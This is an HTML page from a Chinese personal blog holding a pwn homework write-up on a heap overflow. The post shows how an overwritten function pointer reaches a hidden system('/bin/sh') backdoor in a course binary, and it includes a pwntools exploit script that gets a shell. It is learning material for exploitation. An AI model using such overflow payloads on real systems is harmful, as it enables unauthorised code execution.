@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="照常理来讲，作业的难度是循序渐进的，上周有四个题，这周有一个题，那么恐怕这一题难度要顶四题，为此，做题之前把网上能找到的堆溢出手法翻了个遍，那酸爽，差点题还没开就跪了，拿到题之后，经过一番睿智的分析和讨论，突然发现这他妈不是后门大开吗 你这backdoor挺能藏啊 检查使用checksec来查看，发现开启了NX和canary保护  运行直接运行，发现这是类似于一个经典的链表程序，每次选择增删查改的">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="18-堆溢出">
+<meta property="og:url" content="http://yoursite.com/2021/09/07/18-堆溢出/index.html">
+<meta property="og:site_name" content="Jameci&#39;s Blog">
+<meta property="og:description" content="照常理来讲，作业的难度是循序渐进的，上周有四个题，这周有一个题，那么恐怕这一题难度要顶四题，为此，做题之前把网上能找到的堆溢出手法翻了个遍，那酸爽，差点题还没开就跪了，拿到题之后，经过一番睿智的分析和讨论，突然发现这他妈不是后门大开吗 你这backdoor挺能藏啊 检查使用checksec来查看，发现开启了NX和canary保护  运行直接运行，发现这是类似于一个经典的链表程序，每次选择增删查改的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/0.png">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/1.png">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/2.png">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/3.png">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/5.png">
+<meta property="og:image" content="http://yoursite.com/images/18-堆溢出/6.png">
+<meta property="og:updated_time" content="2021-09-08T00:16:01.904Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="18-堆溢出">
+<meta name="twitter:description" content="照常理来讲，作业的难度是循序渐进的，上周有四个题，这周有一个题，那么恐怕这一题难度要顶四题，为此，做题之前把网上能找到的堆溢出手法翻了个遍，那酸爽，差点题还没开就跪了，拿到题之后，经过一番睿智的分析和讨论，突然发现这他妈不是后门大开吗 你这backdoor挺能藏啊 检查使用checksec来查看，发现开启了NX和canary保护  运行直接运行，发现这是类似于一个经典的链表程序，每次选择增删查改的">
+<meta name="twitter:image" content="http://yoursite.com/images/18-堆溢出/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/09/07/18-堆溢出/">
+
+
+
+
+
+  <title>18-堆溢出 | Jameci's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jameci's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">天下雷行，物与无妄。先王以茂对时，育万物。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/07/18-堆溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jameci">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jameci's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">18-堆溢出</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-07T21:08:00+08:00">
+                2021-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><em>照常理来讲，作业的难度是循序渐进的，上周有四个题，这周有一个题，那么恐怕这一题难度要顶四题，为此，做题之前把网上能找到的堆溢出手法翻了个遍，那酸爽，差点题还没开就跪了，拿到题之后，经过一番睿智的分析和讨论，突然发现这他妈不是后门大开吗</em></p>
+<p><strong><em>你这backdoor挺能藏啊</em></strong></p>
+<h1 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h1><p>使用checksec来查看，发现开启了NX和canary保护</p>
+<p><img src="/images/18-堆溢出/0.png" alt></p>
+<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>直接运行，发现这是类似于一个经典的链表程序，每次选择增删查改的一种操作并执行：</p>
+<p><img src="/images/18-堆溢出/1.png" alt></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>打开之后，主要分析的点就是这个增删查改函数</p>
+<h2 id="addnode"><a href="#addnode" class="headerlink" title="addnode"></a>addnode</h2><p>为节省时间，直接反编译</p>
+<p><img src="/images/18-堆溢出/2.png" alt></p>
+<p>v4是64位系统的栈canary保护，我们这里用不到栈溢出，无视它</p>
+<p>下面的for循环是在a指向的地方寻找一个内容是null的指针，如果没有，继续向后找，所以我们推断a是内容为指针的数组，大小为9，每次addnote时会从a数组从前往后找到第一个还没被使用的指针，指向我们要开辟的堆空间</p>
+<p>v1作为长度被输入，下面有一个if循环判断v1是否小于80，若是，重新把v1改为80，意味着这个数组最短也得是80个字符，但有问题的地方来了，下面的malloc只开辟了0x30ull也就是48个字符的空间，把这个空间赋给了*((_QWORD *)&amp;a + v2)</p>
+<blockquote>
+<p>(_QWORD *)&amp;a就是把a转为64位指针，+v2是数组下标，最外面的*是取值，即把a[v2]处赋值为malloc的结果</p>
+</blockquote>
+<p>后面两句，把malloc出来的块进行了一个初始化**((_QWORD *)&amp;a + v2)就是这个块的初始位置，把本块长度记录在此，然后在紧接着的**((_QWORD *)&amp;a + v2)+8的位置，把dellall函数的地址记录下来了</p>
+<p>这样，我们可以画一个块的示意图：</p>
+<p><img src="/images/18-堆溢出/3.png" alt></p>
+<p>很显然我们只需要写入任意一个块超过48个字符，多余的字符就会溢出覆盖到下一个块</p>
+<h2 id="looknode"><a href="#looknode" class="headerlink" title="looknode"></a>looknode</h2><p><img src="/images/18-堆溢出/5.png" alt></p>
+<p>looknode里有一个反常的地方，可以看到在函数的最后，v2直接取出了写在块中的deleall函数地址，并直接执行了，看到v2()这样变量加括号的反常用法，我们立刻感到了不对劲，因为这样一来，我们利用前面的漏洞，直接把想要执行的代码地址放在某个块的deleall上，就可以实现在调用looknode时执行了</p>
+<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>当天下午的进展就到了分析出几个主要函数的用途，但有一个很奇怪的点，就是在使用ROPgadget搜索gadget的时候，无意间发现本程序自带了system和”/bin/sh”，我觉得很奇怪，因为不自然，上面的增删查改功能没有任何一个需要system，于是猜测这程序有后门，但觉得如果真有那就太离谱，因为结合上面的分析，只需要把后门地址传过去，这题就做完了</p>
+<p>结果到了晚上一翻，后门就在sys函数里，sys夹在几个主要函数之间，愣是没注意到</p>
+<p>所以，这题就这样被解决了，最终的思路是，先两次addnode，开辟出索引为0，1的两个块，再writenode输入56任意字符+后门地址，然后looknode索引为1的那一块</p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">conn = process(&quot;./experiment1&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;200&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;200&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;2&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;0&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(b&apos;1&apos; * (48 + 8) + p64(0x400a12))</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;3&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/images/18-堆溢出/6.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/06/21-9-6/" rel="next" title="21/9/6">
+                <i class="fa fa-chevron-left"></i> 21/9/6
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/09/21-9-8/" rel="prev" title="21/9/8">
+                21/9/8 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Jameci</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">258</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#检查"><span class="nav-number">1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#运行"><span class="nav-number">2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#addnode"><span class="nav-number">3.1.</span> <span class="nav-text">addnode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#looknode"><span class="nav-number">3.2.</span> <span class="nav-text">looknode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys"><span class="nav-number">3.3.</span> <span class="nav-text">sys</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本"><span class="nav-number">4.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结果"><span class="nav-number">5.</span> <span class="nav-text">结果</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jameci</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
